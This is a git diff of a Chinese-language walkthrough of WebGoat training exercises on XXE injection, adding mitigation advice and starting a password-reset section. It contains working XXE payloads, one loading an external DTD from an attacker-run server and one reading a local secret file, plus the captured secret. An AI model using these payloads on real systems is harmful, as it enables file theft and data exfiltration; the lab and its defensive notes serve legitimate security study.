@@ -595,7 +595,9 @@ XXE注入攻击是针对某些解析XML输入的应用程序的攻击。在XML�
 
 #### 第3题
 
-在自己设定的一个目录下存入 attack.dtd 和 landing/index.html ,然后使用```python http.server 9999```启动一个简单的http服务器。
+原来的思路：这个思路需要架设服务器，再编写一个文件上传功能。
+
+按照题目建议，在自己设定的一个目录下存入 attack.dtd 和 landing/index.html ,然后使用```python http.server 9999```启动一个简单的http服务器。
 
 
 attack.dtd
@@ -613,3 +615,52 @@ landing/index.html 要有接收上传文件能力。
 ```xml
 <?xml version="1.0"?><!DOCTYPE some_name [ <!ENTITY % some_ent SYSTEM "http://10.10.10.129:9999/attack.dtd">%some_ent;]> <comment>  <text>111222&ping;</text></comment>
 ```
+
+上面的尝试进行了一半，忽然有了新的想法。
+
+与xxe第1题一样，抓包后修改表单提交内容为：
+
+```<?xml version="1.0"?><!DOCTYPE noname [<!ENTITY cat SYSTEM "FILE:///home/webgoat/.webgoat-8.0.0.M25/XXE/secret.txt">]><comment>  <text>&cat;</text></comment>```
+
+提交后，发现题目页面出现了下列字符串：```WebGoat 8.0 rocks... (CVQOamMhlO)```
+
+将其作为内容提交，发现此题过关。看来题目设计的也有点漏洞。
+
+#### XXE 攻击缓解
+
+为了防御XXE攻击，需要验证输入内容。
+
+在Java的世界里，你可以执行自己的解析器，而完全忽略DTD。例如：
+
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
+```
+如果你不能完全关闭DTD支持，你也可以令XML解析器忽略外部实体。例如：
+```java
+XMLInputFactory xif = XMLInputFactory.newFactory();
+xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
+xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
+```
+更多信息，可参考 https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet
+
+在进行输入验证时，要仔细校验 ```Content-type``` and ```Accept`` 等头部参数，不要简单的依赖框架来处理请求。如果客户端修改了头部，要返回一个406/Not Acceptable 错误。
+
+
+
+
+
+## 认证缺陷
+
+### 密码重置
+
+这部分内容介绍了密码重置功能存在的逻辑漏洞，而它往往被开发人员所忽视。教学目标是告诉你如何安全的实现密码重置功能。
+
+不同网站实现密码重置功能是不同的。一些网站上，你需要回答一些问题，另一些网站使用电子邮件接收激活链接。下面我们将看一下这些功能常常存在的漏洞。
+
+一些公司仍然在邮件中以明文发送用户名，你可以在 http://plaintexoffenders.com 看到不少的例子。
+
+#### 第一题 邮件功能
+
+这个题要使用webwolf接收邮件。我没有安装webwolf。
+
